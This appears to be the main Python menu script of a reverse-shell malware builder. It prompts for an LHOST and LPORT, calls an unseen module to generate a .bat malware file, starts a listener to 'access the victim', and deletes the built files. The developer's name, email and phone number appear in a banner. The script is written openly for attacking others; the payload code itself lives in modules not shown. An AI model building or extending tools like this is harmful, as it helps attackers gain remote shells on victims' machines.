import time, os
from colorama import Fore,init
from modules import BannerModule, Make_MalwareModule, MenuModule, Access_victimModule, UpdatesModule, LogsModule
from datetime import datetime


init()

def ReturnMenu():
    time.sleep(0.1)
    print(Fore.CYAN + " [*]" + Fore.RED + " Choose one of the options below " + "\n")
    time.sleep(0.2)
    print(Fore.RED + " [1]" + Fore.LIGHTGREEN_EX + " Build malware for Reverse Shell " + "\n")
    time.sleep(0.1)
    print(Fore.RED + " [2]" + Fore.LIGHTGREEN_EX + " Access from the victim on Reverse Shell " + "\n")
    time.sleep(0.2)
    print(Fore.RED + " [3]" + Fore.LIGHTGREEN_EX + " Clear Malware Files " + "\n")
    time.sleep(0.1)
    print(Fore.GREEN + " [4]" + Fore.LIGHTRED_EX + " Developer :) " + "\n")
    time.sleep(0.2)
    print(Fore.GREEN + " [5]" + Fore.LIGHTMAGENTA_EX + " Upgrade Script With Github " + "\n")
    time.sleep(0.1)
    print(Fore.BLUE + " [6]" + Fore.YELLOW + " Quit Script :) ")
    



# start functions

def GetNowTime():
    now = datetime.now()

    current_time = now.strftime("%H:%M:%S")

    return current_time

def Malware():
    BannerModule.banner()

    try:

        lhost = input(Fore.MAGENTA + " Enter Your LHOST : ")
        lport = input(Fore.MAGENTA + " Enter Your LPORT : ")
        filename = input(Fore.MAGENTA + " Enter Your MalWare Name (MALWARE): ")
    except KeyboardInterrupt:
        MenuModule.quit_script()

    path = Make_MalwareModule.MakeMalware(lhost, lport, filename)

    print("\n" + Fore.BLUE + " Please Wait A Build Walware...")

    time.sleep(3)

    BannerModule.banner()

    print(Fore.RED  + " [+] " + Fore.CYAN + "Malware successfully created : " + path)

    LogsModule.SaveLog('create', "Malware Create For LHOST: {} || LPORT: {} || FILENAME: {} || Time: {}".format(lhost, lport, filename + ".bat", GetNowTime()))





def access_shell():
    BannerModule.banner()

    try:

        lhost = input(Fore.MAGENTA + " Enter Your Listen LHOST : ")
        lport = input(Fore.MAGENTA + " Enter Your Listen LPORT : ")

    except KeyboardInterrupt:
        MenuModule.quit_script()

    print("\n" + Fore.BLUE + " [+] " + Fore.LIGHTGREEN_EX + "Start Server... ")
    time.sleep(3)

    BannerModule.banner()

    LogsModule.SaveLog('check', "Server Listing On [{}:{}] is time : {}".format(lhost, lport, GetNowTime()))

    Access_victimModule.access(lhost, lport)



def quit_script():
    BannerModule.banner()
    print(Fore.RED + "[-] " + Fore.LIGHTCYAN_EX + "You Exited :)")

    print(Fore.RESET)
    LogsModule.SaveLog("quit", "User Exit Script is time : " + GetNowTime())

    exit()
    


def developer_info():

    BannerModule.banner()

    body = """
    ====================================================================
    **                  WebSite : website.org                         **
    **                  email : zarea9452@gmail.com                   **
    **                 Developer : Alireza Zare                       **
    **               Team Numbers : +989945179016                     **
    **                   Thank's : .::ultraamooz::.                   **
    ====================================================================     
"""

    time.sleep(0.4)


    print(Fore.LIGHTBLACK_EX + " [~] " + Fore.RED + "Developer Info" + "\n")

    print(Fore.LIGHTGREEN_EX + body)

    LogsModule.SaveLog("check", "User Open Developer Info Script is time : " + GetNowTime())


def updater():
    BannerModule.banner()
    print(Fore.RED + " [+] " + Fore.CYAN + "You can get all the updates from GitHub")
    upd = UpdatesModule.GetUpdate()

    print("\n" + """
    {}
    """.format(Fore.LIGHTGREEN_EX + upd))

    LogsModule.SaveLog("check", "User Open Update Page Script is time : " + GetNowTime())


def clear_malwares():
    BannerModule.banner()
    print(Fore.YELLOW + " [~] " + Fore.GREEN +"Please Wait Remove All bat Files... ")
    time.sleep(3)
    os.system("del output\\*.bat")
    BannerModule.banner()
    print(Fore.RED + " [+] " + Fore.LIGHTMAGENTA_EX + "Malware list cleared!")

    LogsModule.SaveLog("remove", "Clear Malware Files is time : " + GetNowTime())


def back_to_menu():
    try:
        input(Fore.LIGHTRED_EX+" [*] Back To Main Menu (Press Enter...) ")
        print(Fore.RESET)
        os.system("python killer.py")
    except KeyboardInterrupt:
        MenuModule.quit_script()


# end functions


